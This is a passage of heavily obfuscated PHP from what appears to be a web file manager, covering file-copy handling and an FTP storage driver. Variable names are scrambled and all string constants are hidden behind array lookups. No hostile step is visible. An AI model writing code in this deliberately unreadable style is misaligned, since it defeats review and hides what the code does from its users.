$ñ∂¥Ô®ä[$¯üÅ≥ö¸[549]] = _get($ñ∂¥Ô®ä, $¯üÅ≥ö¸[549], 0); if (!isset($ñ∂¥Ô®ä[$¯üÅ≥ö¸[678]]) && $ñ∂¥Ô®ä[$¯üÅ≥ö¸[549]]) { $åıõ¡óÄ[$¯üÅ≥ö¸[675]][] = $ñ∂¥Ô®ä[$¯üÅ≥ö¸[549]]; } if ($ÙÖã‹â¥) { $ﬂ≤ß‚˛≈ = $this->fileNameExistCache($Ûéî∂ˆ±, $ñ∂¥Ô®ä[$¯üÅ≥ö¸[32]]); if ($ﬂ≤ß‚˛≈) { if ($ñ∂¥Ô®ä[$¯üÅ≥ö¸[493]] || $ÙÖã‹â¥ == REPEAT_SKIP) { continue; } if ($ÙÖã‹â¥ == REPEAT_REPLACE) { $Ú∆ﬁ¥Ò· = $this->sourceInfoCache($ﬂ≤ß‚˛≈); $âÚÑ¶Ø∏ = $this->fileHistory($Ú∆ﬁ¥Ò·, $ñ∂¥Ô®ä[$¯üÅ≥ö¸[549]], $ñ∂¥Ô®ä[$¯üÅ≥ö¸[79]]); if ($âÚÑ¶Ø∏) { $åıõ¡óÄ[$¯üÅ≥ö¸[637]][] = $ñ∂¥Ô®ä[$¯üÅ≥ö¸[549]]; } continue; } else { if ($ÙÖã‹â¥ == REPEAT_RENAME) { $ñ∂¥Ô®ä[$¯üÅ≥ö¸[32]] = $this->fileNameAutoCache($Ûéî∂ˆ±, $ñ∂¥Ô®ä[$¯üÅ≥ö¸[32]], $ÙÖã‹â¥, !1); } } } } if (!$ñ∂¥Ô®ä[$¯üÅ≥ö¸[493]] && $ñ∂¥Ô®ä[$¯üÅ≥ö¸[549]] == 0) { continue; } if (!$ñ∂¥Ô®ä[$¯üÅ≥ö¸[493]] && $ñ∂¥Ô®ä[$¯üÅ≥ö¸[549]]) { $åıõ¡óÄ[$¯üÅ≥ö¸[637]][] = $ñ∂¥Ô®ä[$¯üÅ≥ö¸[549]]; } $¡æµ”·∏[] = $this->_makeItemData($ñ∂¥Ô®ä, $„∞’öÊ‚, $ñ∂¥Ô®ä[$¯üÅ≥ö¸[32]]); } unset($ñ∂¥Ô®ä); if (!empty($¡æµ”·∏)) { $this->addAll($¡æµ”·∏); $this->_childrenListSelect($Ûéî∂ˆ±); } $ôÁôŸªÎ = $this->_childrenList($Ûéî∂ˆ±); $ôÁôŸªÎ = array_to_keyvalue($ôÁôŸªÎ, $¯üÅ≥ö¸[32]); foreach ($∫”ø∞˝ÿ as $ñ∂¥Ô®ä) { $Ú∆ﬁ¥Ò· = $ôÁôŸªÎ[$ñ∂¥Ô®ä[$¯üÅ≥ö¸[32]]]; $∂¯Ï»ˆÉ = $Ú∆ﬁ¥Ò·[$¯üÅ≥ö¸[193]]; $this->_copyApplyMeta($Ú∆ﬁ¥Ò·, $åıõ¡óÄ); if ($ñ∂¥Ô®ä[$¯üÅ≥ö¸[33]] == $¯üÅ≥ö¸[78]) { $ñ∂¥Ô®ä[$¯üÅ≥ö¸[87]] = $Ã”ªıƒà->getPathInner($ñ∂¥Ô®ä[$¯üÅ≥ö¸[87]]); $this->_copyChildTo($Ã”ªıƒà, $ñ∂¥Ô®ä[$¯üÅ≥ö¸[87]], $∂¯Ï»ˆÉ, $ÙÖã‹â¥, $åıõ¡óÄ, $Û≤Ñ‚èë); } } } private function _addFiles($ßœÄçê°, $ñíï°Óê, $ªÕøÌóù) { $Œ¥æÖ«Á =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$ñíï°Óê || count($ñíï°Óê) == 0) { return array(); } $ù¬Èú∞™ = array(); foreach ($ñíï°Óê as &$∆˜û˛±) { Hook::trigger($Œ¥æÖ«Á[679], $∆˜û˛±); $∆˜û˛±[$Œ¥æÖ«Á[87]] = $ßœÄçê°->getPathInner($∆˜û˛±[$Œ¥æÖ«Á[87]]); $Œ§‹œ∑∑ = $ßœÄçê°->hashSimple($∆˜û˛±[$Œ¥æÖ«Á[87]]); $ÚÅÆü¶˙ = $ßœÄçê°->hashMd5($∆˜û˛±[$Œ¥æÖ«Á[87]]); if (strlen($ÚÅÆü¶˙) > 10 && !isset($ù¬Èú∞™[$ÚÅÆü¶˙])) { $ù¬Èú∞™[$ÚÅÆü¶˙] = array(); } $∆˜û˛±[$Œ¥æÖ«Á[680]] = $Œ§‹œ∑∑; $∆˜û˛±[$Œ¥æÖ«Á[555]] = $ÚÅÆü¶˙; $ù¬Èú∞™[$ÚÅÆü¶˙][] =& $∆˜û˛±; if (count($ù¬Èú∞™[$ÚÅÆü¶˙]) > 1) { $∆˜û˛±[$Œ¥æÖ«Á[678]] = !0; } Hook::trigger($Œ¥æÖ«Á[681], $∆˜û˛±); } unset($∆˜û˛±); $•ÆùÁ„© = array($Œ¥æÖ«Á[555] => array($Œ¥æÖ«Á[7], array_keys($ù¬Èú∞™))); $„•‚Á˜˙ = Model($Œ¥æÖ«Á[682]); $∏æäüÏì = $„•‚Á˜˙->where($•ÆùÁ„©)->select(); $∏æäüÏì = $∏æäüÏì ? $∏æäüÏì : array(); foreach ($∏æäüÏì as $ò∑Ø”Û‡) { if (!isset($ù¬Èú∞™[$ò∑Ø”Û‡[$Œ¥æÖ«Á[555]]])) { continue; } $°≤ó◊§© = $ù¬Èú∞™[$ò∑Ø”Û‡[$Œ¥æÖ«Á[555]]]; foreach ($°≤ó◊§© as &$∆˜û˛±) { $∆˜û˛±[$Œ¥æÖ«Á[549]] = $ò∑Ø”Û‡[$Œ¥æÖ«Á[549]]; $∆˜û˛±[$Œ¥æÖ«Á[678]] = !0; } unset($∆˜û˛±); } $µ£äÈ€ë = array(); foreach ($ñíï°Óê as $„¶Ó˜»˘) { Hook::trigger($Œ¥æÖ«Á[683], $„¶Ó˜»˘); if (isset($„¶Ó˜»˘[$Œ¥æÖ«Á[678]]) && $„¶Ó˜»˘[$Œ¥æÖ«Á[678]]) { Hook::trigger($Œ¥æÖ«Á[684], $„¶Ó˜»˘); continue; } $§õ÷≥Ÿü = $ßœÄçê°->getPathInner($„¶Ó˜»˘[$Œ¥æÖ«Á[87]]); $ËÆŒæä™ = $„•‚Á˜˙->addFileMake($§õ÷≥Ÿü, $„¶Ó˜»˘[$Œ¥æÖ«Á[79]], $„¶Ó˜»˘[$Œ¥æÖ«Á[680]], $„¶Ó˜»˘[$Œ¥æÖ«Á[555]], $„¶Ó˜»˘[$Œ¥æÖ«Á[32]], $ªÕøÌóù); Hook::trigger($Œ¥æÖ«Á[684], $„¶Ó˜»˘); if (!is_array($ËÆŒæä™)) { continue; } $µ£äÈ€ë[] = $ËÆŒæä™; } $„•‚Á˜˙->addAll($µ£äÈ€ë); $•ÆùÁ„© = array($Œ¥æÖ«Á[555] => array($Œ¥æÖ«Á[7], array_keys($ù¬Èú∞™))); $∏æäüÏì = $„•‚Á˜˙->where($•ÆùÁ„©)->select(); $∏æäüÏì = $∏æäüÏì ? $∏æäüÏì : array(); foreach ($∏æäüÏì as $ò∑Ø”Û‡) { if (!isset($ù¬Èú∞™[$ò∑Ø”Û‡[$Œ¥æÖ«Á[555]]])) { continue; } $àÂöü≠Ü =& $ù¬Èú∞™[$ò∑Ø”Û‡[$Œ¥æÖ«Á[555]]]; foreach ($àÂöü≠Ü as &$∆˜û˛±) { $∆˜û˛±[$Œ¥æÖ«Á[549]] = $ò∑Ø”Û‡[$Œ¥æÖ«Á[549]]; } unset($∆˜û˛±); } $ïŒΩÃ‰» = array(); foreach ($ñíï°Óê as $≥œ˙†ò˛) { $ïŒΩÃ‰»[$≥œ˙†ò˛[$Œ¥æÖ«Á[32]]] = $≥œ˙†ò˛; } return $ïŒΩÃ‰»; } } define($_SERVER[ß⁄ˆÇ†Œ][685], $_SERVER[ß⁄ˆÇ†Œ][686]); goto DêâÙé‹•Ñ; fÖÀ÷â∆ûâ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ÊﬁóÍπ∞) { parent::__construct(); if (count($ÊﬁóÍπ∞) > 0) { $this->_init($ÊﬁóÍπ∞); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Ÿ»’¥î) { $„ﬂÅÑÌç =& $_SERVER[ß⁄ˆÇ†Œ]; global $config; $this->appCharset = $config[$„ﬂÅÑÌç[1432]]; $this->systemCharset = $config[$„ﬂÅÑÌç[1433]]; if (isset($Ÿ»’¥î[$„ﬂÅÑÌç[1434]]) && $Ÿ»’¥î[$„ﬂÅÑÌç[1434]]) { $this->systemCharset = $Ÿ»’¥î[$„ﬂÅÑÌç[1434]]; } } public function iconvApp($¥∂˙≠÷â) { return $this->iconvTo($¥∂˙≠÷â, $this->systemCharset, $this->appCharset); } public function iconvSystem($ë‰ˆƒ™¿) { return $this->iconvTo($ë‰ˆƒ™¿, $this->appCharset, $this->systemCharset); } public function getPathOuter($í≠û‰Çì) { $ºé–øæ— =& $_SERVER[ß⁄ˆÇ†Œ]; $¯≠∑˛…± = $this->iconvApp($this->pathBase); $í≠û‰Çì = $this->iconvApp($í≠û‰Çì); if (substr($¯≠∑˛…±, 0, 2) == $ºé–øæ—[1406]) { $¯≠∑˛…± = BASIC_PATH . substr($¯≠∑˛…±, 2); } if (substr($í≠û‰Çì, 0, 2) == $ºé–øæ—[1406]) { $í≠û‰Çì = BASIC_PATH . substr($í≠û‰Çì, 2); } $¯≠∑˛…± = KodIO::clear($¯≠∑˛…±); $í≠û‰Çì = KodIO::clear($í≠û‰Çì); $í≠û‰Çì = substr($í≠û‰Çì, strlen($¯≠∑˛…±)); if (empty($this->pathDriver)) { return $í≠û‰Çì; } return $this->pathDriver . $ºé–øæ—[8] . ltrim($í≠û‰Çì, $ºé–øæ—[8]); } private function _init($éÖØÜ√Ü = array()) { $ıﬁ√«‚· =& $_SERVER[ß⁄ˆÇ†Œ]; if (!function_exists($ıﬁ√«‚·[1435])) { throw new Exception(LNG($ıﬁ√«‚·[1436])); } $this->config = $éÖØÜ√Ü; $this->charsetReset($éÖØÜ√Ü); foreach ($éÖØÜ√Ü as $†åë˘≠ô => $·ï… ê˜) { if (isset($this->{$†åë˘≠ô})) { $this->{$†åë˘≠ô} = $·ï… ê˜; } } return $this->_login($éÖØÜ√Ü); } private function _login($¡¥ÒÂ‡) { $á±ıÑøø =& $_SERVER[ß⁄ˆÇ†Œ]; static $éÔÅ∏™Ú = array(); $†çË‘âé = md5(json_encode($¡¥ÒÂ‡)); if (isset($éÔÅ∏™Ú[$†çË‘âé])) { foreach ($éÔÅ∏™Ú[$†çË‘âé] as $â£âáòÕ => $⁄Ñ†‚‘ò) { $this->{$â£âáòÕ} = $⁄Ñ†‚‘ò; } return !0; } $ƒ™„ÇÏº = parse_url(trim($this->server, $á±ıÑøø[8])); $this->host = $ƒ™„ÇÏº[$á±ıÑøø[208]]; $Á”ˆûé÷ = isset($ƒ™„ÇÏº[$á±ıÑøø[207]]) && $ƒ™„ÇÏº[$á±ıÑøø[207]] == $á±ıÑøø[1437] ? !0 : !1; $this->scheme = $Á”ˆûé÷ ? $á±ıÑøø[1438] : $á±ıÑøø[1439]; $this->port = isset($ƒ™„ÇÏº[$á±ıÑøø[209]]) ? $ƒ™„ÇÏº[$á±ıÑøø[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($á±ıÑøø[1440]) . $this->host . $á±ıÑøø[4] . $this->port, !0); return !1; } $õ˝¬£ßº = @ftp_login($this->connect, $this->username, $this->userpass); if (!$õ˝¬£ßº) { $this->writeLog(LNG($á±ıÑøø[1441]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $∞ı–ñ˙ = $this->pasv == $á±ıÑøø[91] ? !0 : !1; @ftp_pasv($this->connect, $∞ı–ñ˙); $éÔÅ∏™Ú[$†çË‘âé] = array($á±ıÑøø[1442] => $this->connect, $á±ıÑøø[208] => $this->host, $á±ıÑøø[207] => $this->scheme, $á±ıÑøø[209] => $this->port); return $õ˝¬£ßº; } private function _isconn($áäıÅµ› = true) { if (is_resource($this->connect)) { return !0; } if (!$áäıÅµ›) { return !1; } return $this->_login($this->config); } public function mkfile($Ñ“¬≤©‰, $”ÎÖı”Û = '', $£Ç”Ü»Å = REPEAT_RENAME) { if ($this->setContent($Ñ“¬≤©‰, $”ÎÖı”Û)) { return $this->getPathOuter($Ñ“¬≤©‰); } $this->writeLog(LNG($_SERVER[ß⁄ˆÇ†Œ][1443]), !0); return !1; } public function mkdir($≥…¨∆È˛, $Ê≤ºØËÅ = REPEAT_SKIP) { $ÑÛ’Øà =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$≥…¨∆È˛ || $≥…¨∆È˛ == $ÑÛ’Øà[8]) { return !0; } if (!$this->_isconn()) { return !1; } $≥…¨∆È˛ = $this->iconvSystem($≥…¨∆È˛); if ($this->_isFolder($≥…¨∆È˛) || @ftp_mkdir($this->connect, $≥…¨∆È˛)) { return $this->getPathOuter($≥…¨∆È˛); } if (!$this->mkdir($this->pathFather($≥…¨∆È˛))) { return !1; } if ($≥…¨∆È˛ = @ftp_mkdir($this->connect, $≥…¨∆È˛)) { return $this->getPathOuter($≥…¨∆È˛); } $this->writeLog(__FUNCTION__ . $ÑÛ’Øà[1444], !0); return !1; } public function copyFile($≤ÿÓ°Ò€, $◊âÜá˛‚) { if (!$this->_isconn()) { return !1; } $ÚÓÃå†  = $this->pathThis($this->iconvSystem($≤ÿÓ°Ò€)); $Ûÿëœò∏ = $this->tempFile($ÚÓÃå† ); $™™¯Ï¡‹ = $this->iconvApp($Ûÿëœò∏); $this->download($≤ÿÓ°Ò€, $™™¯Ï¡‹); $∞ñü’¶Ÿ = $this->upload($◊âÜá˛‚, $™™¯Ï¡‹); $this->tempFileRemve($Ûÿëœò∏); return $∞ñü’¶Ÿ; } public function moveFile($ÛÌàÙ™Ù, $˚ëëØÖ¶) { if (!$this->_isconn()) { return !1; } $ÛÌàÙ™Ù = $this->iconvSystem($ÛÌàÙ™Ù); $˚ëëØÖ¶ = $this->iconvSystem($˚ëëØÖ¶); $∫ô¡ï˜Ÿ = @ftp_rename($this->connect, $ÛÌàÙ™Ù, $˚ëëØÖ¶); if (!$∫ô¡ï˜Ÿ) { $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][1444], !0); return !1; } return $this->getPathOuter($˚ëëØÖ¶); } public function delFile($ìüâò¯π) { if (!$this->_isconn()) { return !1; } $ìüâò¯π = $this->iconvSystem($ìüâò¯π); $ê»ÌÁ§¸ = @ftp_delete($this->connect, $ìüâò¯π); if (!$ê»ÌÁ§¸) { $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][1444], !0); } return $ê»ÌÁ§¸; } public function delFolder($¨âÓìî©) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $œ˙ºÎöì = $Ûã∆ëíè = array(); $this->fileList($¨âÓìî©, $œ˙ºÎöì, $Ûã∆ëíè, !0); $this->listItemCache = !0; foreach ($Ûã∆ëíè as $ä”™ßª≠) { $ÔáúÙÒ¨ = $this->iconvSystem($ä”™ßª≠[$_SERVER[ß⁄ˆÇ†Œ][32]]); $î›Ùò‹â = @ftp_delete($this->connect, $ÔáúÙÒ¨); if (!$î›Ùò‹â) { return !1; } } foreach ($œ˙ºÎöì as $ÔáúÙÒ¨) { $ÔáúÙÒ¨ = $this->iconvSystem($ÔáúÙÒ¨); $î›Ùò‹â = @ftp_rmdir($this->connect, $ÔáúÙÒ¨); if (!$î›Ùò‹â) { return !1; } } $¨âÓìî© = $this->iconvSystem($¨âÓìî©); return @ftp_rmdir($this->connect, $¨âÓìî©); } public function rename($ó≠ä∏´µ, $˝˙∏µ˛â) { $˛›ú”ûÇ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->_isconn()) { return !1; } $ÒÑÖ†Ωù = $this->fileNameAuto($this->pathFather($ó≠ä∏´µ), $˝˙∏µ˛â); $ÒÑÖ†Ωù = $this->iconvSystem($ÒÑÖ†Ωù); $ó≠ä∏´µ = $this->iconvSystem($ó≠ä∏´µ); $ÑÎâ∞¿÷ = $this->pathFather($ó≠ä∏´µ); $ÂÙÇå¯˙ = rtrim($ÑÎâ∞¿÷, $˛›ú”ûÇ[8]) . $˛›ú”ûÇ[8] . $ÒÑÖ†Ωù; $¸≠‘‘î› = @ftp_rename($this->connect, $ó≠ä∏´µ, $ÂÙÇå¯˙); if (!$¸≠‘‘î›) { $this->writeLog(__FUNCTION__ . $˛›ú”ûÇ[1444], !0); return !1; } $ÂÙÇå¯˙ = $this->iconvApp($ÂÙÇå¯˙); return $this->getPathOuter($ÂÙÇå¯˙); } private function folderInfo($¢⁄Æ‰Ìâ, $±ÌÃõÏ = false) { $áÅˆ‰ë¸ =& $_SERVER[ß⁄ˆÇ†Œ]; $Â£â—È» = array($áÅˆ‰ë¸[32] => $this->pathThis($¢⁄Æ‰Ìâ), $áÅˆ‰ë¸[87] => $this->getPathOuter($áÅˆ‰ë¸[8] . $¢⁄Æ‰Ìâ), $áÅˆ‰ë¸[33] => $áÅˆ‰ë¸[78]); if ($±ÌÃõÏ) { return $Â£â—È»; } $Â£â—È»[$áÅˆ‰ë¸[231]] = $Â£â—È»[$áÅˆ‰ë¸[88]] = 0; $Â£â—È»[$áÅˆ‰ë¸[232]] = $Â£â—È»[$áÅˆ‰ë¸[233]] = !0; return $Â£â—È»; } private function fileInfo($˛∂ ◊≈É, $¡Ï∂‘ù√ = false, $»÷”ÜÛÌ = array()) { $û˘é˙Èı =& $_SERVER[ß⁄ˆÇ†Œ]; $õÈ»ãè¡ = array($û˘é˙Èı[32] => $this->pathThis($˛∂ ◊≈É), $û˘é˙Èı[87] => $this->getPathOuter($û˘é˙Èı[8] . $˛∂ ◊≈É), $û˘é˙Èı[33] => $û˘é˙Èı[230], $û˘é˙Èı[79] => isset($»÷”ÜÛÌ[$û˘é˙Èı[79]]) ? $»÷”ÜÛÌ[$û˘é˙Èı[79]] : 0, $û˘é˙Èı[169] => $this->ext($˛∂ ◊≈É)); if ($¡Ï∂‘ù√) { return $õÈ»ãè¡; } $õÈ»ãè¡[$û˘é˙Èı[231]] = $õÈ»ãè¡[$û˘é˙Èı[88]] = 0; $õÈ»ãè¡[$û˘é˙Èı[232]] = $õÈ»ãè¡[$û˘é˙Èı[233]] = !0; $Ìºˆ⁄°í = $this->iconvSystem($˛∂ ◊≈É); $õÈ»ãè¡[$û˘é˙Èı[88]] = @ftp_mdtm($this->connect, $Ìºˆ⁄°í); if (empty($»÷”ÜÛÌ)) { $»÷”ÜÛÌ = $this->objectMeta($˛∂ ◊≈É); if (!$»÷”ÜÛÌ) { return $õÈ»ãè¡; } } $õÈ»ãè¡[$û˘é˙Èı[79]] = $»÷”ÜÛÌ[$û˘é˙Èı[79]]; return $õÈ»ãè¡; } public function size($ÎÖ™—≈˘) { $ﬁù∆ˆ£ = $this->objectMeta($ÎÖ™—≈˘); return $ﬁù∆ˆ£ ? $ﬁù∆ˆ£[$_SERVER[ß⁄ˆÇ†Œ][79]] : 0; } public function info($èø⁄“Ü†) { if ($this->isFile($èø⁄“Ü†)) { return $this->fileInfo($èø⁄“Ü†, 0); } else { if ($this->isFolder($èø⁄“Ü†)) { return $this->folderInfo($èø⁄“Ü†); } } return !1; } private function fileList($Ù∫ÁıÍŒ, &$§∂çÓÂÏ, &$ñÍ›ı≥¶, $îç˜ˆ‚Ç = false) { $Ñ›È∑ÎÊ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ù∫ÁıÍŒ = $this->iconvSystem($Ù∫ÁıÍŒ); if (!$this->isFolder($Ù∫ÁıÍŒ)) { return !1; } @ftp_chdir($this->connect, $Ñ›È∑ÎÊ[8]); $Ù∫ÁıÍŒ = rtrim($Ù∫ÁıÍŒ, $Ñ›È∑ÎÊ[8]) . $Ñ›È∑ÎÊ[8]; check_abort(); $…õì˙ØÇ = @ftp_rawlist($this->connect, $Ù∫ÁıÍŒ); if (!$…õì˙ØÇ) { $…õì˙ØÇ = array(); } $˝ö¬ˆ∫Í = array($Ñ›È∑ÎÊ[10] => 1, $Ñ›È∑ÎÊ[1359] => 1); foreach ($…õì˙ØÇ as $∏Ú•÷€È) { $‘Ôä»„¡ = $this->_listItem($∏Ú•÷€È); if ($‘Ôä»„¡[0] == $Ñ›È∑ÎÊ[831]) { continue; } $çÚâÉ˙î = $‘Ôä»„¡[8]; if (empty($çÚâÉ˙î) && $çÚâÉ˙î !== $Ñ›È∑ÎÊ[228] || isset($˝ö¬ˆ∫Í[$çÚâÉ˙î])) { continue; } $çÚâÉ˙î = $this->iconvApp($Ù∫ÁıÍŒ . ltrim($çÚâÉ˙î, $Ñ›È∑ÎÊ[8])); $£˛÷ﬂäœ = array($Ñ›È∑ÎÊ[32] => $çÚâÉ˙î, $Ñ›È∑ÎÊ[33] => $Ñ›È∑ÎÊ[230], $Ñ›È∑ÎÊ[79] => $‘Ôä»„¡[4]); if (substr($∏Ú•÷€È, 0, 1) == $Ñ›È∑ÎÊ[1445]) { $£˛÷ﬂäœ[$Ñ›È∑ÎÊ[33]] = $Ñ›È∑ÎÊ[78]; $£˛÷ﬂäœ[$Ñ›È∑ÎÊ[79]] = 0; } $´ÜöÜµŒ = $£˛÷ﬂäœ[$Ñ›È∑ÎÊ[33]] == $Ñ›È∑ÎÊ[78] ? !0 : !1; $this->cacheMethodInfoSet($çÚâÉ˙î, $´ÜöÜµŒ, $£˛÷ﬂäœ); if ($´ÜöÜµŒ) { $§∂çÓÂÏ[] = $çÚâÉ˙î; if ($îç˜ˆ‚Ç) { $this->fileList($çÚâÉ˙î, $§∂çÓÂÏ, $ñÍ›ı≥¶, $îç˜ˆ‚Ç); } continue; } $ñÍ›ı≥¶[] = $£˛÷ﬂäœ; } $this->cacheMethodInfoSet($Ù∫ÁıÍŒ, !0); } private function _listItem($ÄŒ¨óÎÎ) { if (empty($ÄŒ¨óÎÎ)) { return array(); } $ŸΩºÖ∫À = preg_split($_SERVER[ß⁄ˆÇ†Œ][1446], $ÄŒ¨óÎÎ); if (count($ŸΩºÖ∫À) <= 9) { return $ŸΩºÖ∫À; } $ŸΩºÖ∫À[8] = trim(substr($ÄŒ¨óÎÎ, strpos($ÄŒ¨óÎÎ, $ŸΩºÖ∫À[7]) + strlen($ŸΩºÖ∫À[7]))); return array_splice($ŸΩºÖ∫À, 0, 9); } public function listPath($¯€“°ÿ, $ÁòΩ®Ω… = false) { $Ç•ßÁä› =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->_isconn()) { return !1; } $¯›ÍÑÌƒ = $¶˛ÅÖ‚Ï = array(); $this->fileList($¯€“°ÿ, $¯›ÍÑÌƒ, $¶˛ÅÖ‚Ï); foreach ($¯›ÍÑÌƒ as $é˙ÿˆÔÅ => $◊•£◊‰É) { $¯›ÍÑÌƒ[$é˙ÿˆÔÅ] = $this->folderInfo($◊•£◊‰É, $ÁòΩ®Ω…); } foreach ($¶˛ÅÖ‚Ï as $é˙ÿˆÔÅ => $◊•£◊‰É) { $¶˛ÅÖ‚Ï[$é˙ÿˆÔÅ] = $this->fileInfo($◊•£◊‰É[$Ç•ßÁä›[32]], $ÁòΩ®Ω…, $◊•£◊‰É); } return array($Ç•ßÁä›[85] => $¯›ÍÑÌƒ, $Ç•ßÁä›[86] => $¶˛ÅÖ‚Ï); } public function has($ÛÊá¬Ã≤, $±∫∆®Øå = false, $˚±Ó‹Õ∫ = true) { $‡Û¿íó≤ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÜÁóüõã = $πªëÕ¸å = array(); $Í√ô¿¸™ = $±∫∆®Øå ? !0 : !1; $this->fileList($ÛÊá¬Ã≤, $ÜÁóüõã, $πªëÕ¸å, $Í√ô¿¸™); if ($±∫∆®Øå) { return array($‡Û¿íó≤[239] => count($πªëÕ¸å), $‡Û¿íó≤[240] => count($ÜÁóüõã)); } if ($˚±Ó‹Õ∫) { if (count($πªëÕ¸å)) { return !0; } } else { if (count($ÜÁóüõã)) { return !0; } } return !1; } public function listAll($ò®ÿŒ®«) { $Î§€©°Ï =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$this->_isconn()) { return !1; } $œË‹ì¿÷ = $ı†ÉıÄ© = array(); $this->fileList($ò®ÿŒ®«, $œË‹ì¿÷, $ı†ÉıÄ©, !0); $Ñ§¢°Ú™ = array_to_keyvalue($ı†ÉıÄ©, $Î§€©°Ï[32]); foreach ($œË‹ì¿÷ as $á‹∞·‘) { if (is_string($á‹∞·‘)) { $Ñ§¢°Ú™[$á‹∞·‘] = array($Î§€©°Ï[79] => 0); } } return $this->listAllFiles($ò®ÿŒ®«, $Ñ§¢°Ú™); } public function getContent($ÒÎ˚Øµê) { if (!$this->_isconn()) { return !1; } $ÒÎ˚Øµê = $this->iconvSystem($ÒÎ˚Øµê); return $this->fileSubstr($ÒÎ˚Øµê); } public function setContent($é˙∏êÌÜ, $‹üçÌáé = '') { if (!$this->_isconn()) { return !1; } $‡“´òÁ… = $this->pathThis($this->iconvSystem($é˙∏êÌÜ)); $ßºªû˘ï = $this->tempFile($‡“´òÁ…); file_put_contents($ßºªû˘ï, $‹üçÌáé); $ÅÕ·ûöˆ = $this->upload($é˙∏êÌÜ, $this->iconvApp($ßºªû˘ï)); $this->tempFileRemve($ßºªû˘ï); return $ÅÕ·ûöˆ; } public function fileSubstr($ÙÚ‘ÖŸÿ, $å›íÒÖ‡ = 0, $‚ë‚Ôß◊ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($ÙÚ‘ÖŸÿ, $å›íÒÖ‡, $‚ë‚Ôß◊); } private function ftpRequest($‡¥‚◊ÈË, $Â´≠ØΩ‰ = 0, $ù±ô´úü = false) { $‡¥‚◊ÈË = $this->iconvSystem($‡¥‚◊ÈË); $◊‹”œÇ« = $this->scheme . $this->host . $_SERVER[ß⁄ˆÇ†Œ][4] . $this->port; $≥ÓÒÍ‡æ = curl_init(); curl_setopt($≥ÓÒÍ‡æ, CURLOPT_URL, $◊‹”œÇ« . $this->pathEncode($‡¥‚◊ÈË)); curl_setopt($≥ÓÒÍ‡æ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ù±ô´úü) { $ë÷©ıÀÆ = $Â´≠ØΩ‰ + $ù±ô´úü - 1; curl_setopt($≥ÓÒÍ‡æ, CURLOPT_RANGE, "{$Â´≠ØΩ‰}\55{$ë÷©ıÀÆ}"); } curl_setopt($≥ÓÒÍ‡æ, CURLOPT_RETURNTRANSFER, 1); $¶®¯ë™ø = curl_exec($≥ÓÒÍ‡æ); curl_close($≥ÓÒÍ‡æ); return $¶®¯ë™ø; } public function upload($Úèù çî, $«ØœÒ€π, $Ôÿ¬©≤¿ = false, $Öéè∑Êã = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Úèù çî))) { return !1; } $Úèù çî = $this->iconvSystem($Úèù çî); $«ØœÒ€π = $this->iconvSystem($«ØœÒ€π); $ª◊Ÿ≈òÓ = ftp_nb_put($this->connect, $Úèù çî, $«ØœÒ€π, FTP_BINARY); while ($ª◊Ÿ≈òÓ == FTP_MOREDATA) { $ª◊Ÿ≈òÓ = ftp_nb_continue($this->connect); } if ($ª◊Ÿ≈òÓ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][1444], !0); return !1; } return $this->getPathOuter($Úèù çî); } public function download($äôÙÁƒΩ, $≤›Íà˘· = '') { if (!$this->_isconn()) { return !1; } $¨ß´ü§¯ = $this->pathFather($≤›Íà˘·); if (!IO::mkdir($¨ß´ü§¯)) { return !1; } $äôÙÁƒΩ = $this->iconvSystem($äôÙÁƒΩ); $≤›Íà˘· = $this->iconvSystem($≤›Íà˘·); $ëäÄƒµÓ = ftp_nb_get($this->connect, $≤›Íà˘·, $äôÙÁƒΩ, FTP_BINARY); while ($ëäÄƒµÓ == FTP_MOREDATA) { $ëäÄƒµÓ = ftp_nb_continue($this->connect); } if ($ëäÄƒµÓ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ß⁄ˆÇ†Œ][1444], !0); return !1; } return $this->iconvApp($≤›Íà˘·); } public function exist($˝Ââ‚¸Œ) { return $this->isFile($˝Ââ‚¸Œ) || $this->isFolder($˝Ââ‚¸Œ); } public function isFile($∫ÿ˘ñÆ¯) { return !$this->isFolder($∫ÿ˘ñÆ¯) && $this->objectMeta($∫ÿ˘ñÆ¯); } public function isFolder($ﬁæˆ„µç) { return $this->cacheMethod($_SERVER[ß⁄ˆÇ†Œ][179], $ﬁæˆ„µç); } protected function objectMeta($µ∆Óß‘Ω) { return $this->cacheMethod($_SERVER[ß⁄ˆÇ†Œ][181], $µ∆Óß‘Ω); } protected function _objectMeta($–ıÁ≤ﬁß) { $√ Îƒéà =& $_SERVER[ß⁄ˆÇ†Œ]; if ($–ıÁ≤ﬁß == $√ Îƒéà[12] || $–ıÁ≤ﬁß == $√ Îƒéà[8]) { return array(); } if (!$this->_isconn()) { return !1; } $–ıÁ≤ﬁß = $this->iconvSystem($–ıÁ≤ﬁß); $©ı Û˛í = array($√ Îƒéà[32] => $this->iconvApp($–ıÁ≤ﬁß), $√ Îƒéà[33] => $√ Îƒéà[230], $√ Îƒéà[79] => 0); @ftp_chdir($this->connect, $√ Îƒéà[8]); $”˝óìèµ = @ftp_size($this->connect, $–ıÁ≤ﬁß); if ($”˝óìèµ != -1) { $©ı Û˛í[$√ Îƒéà[79]] = $”˝óìèµ; } else { 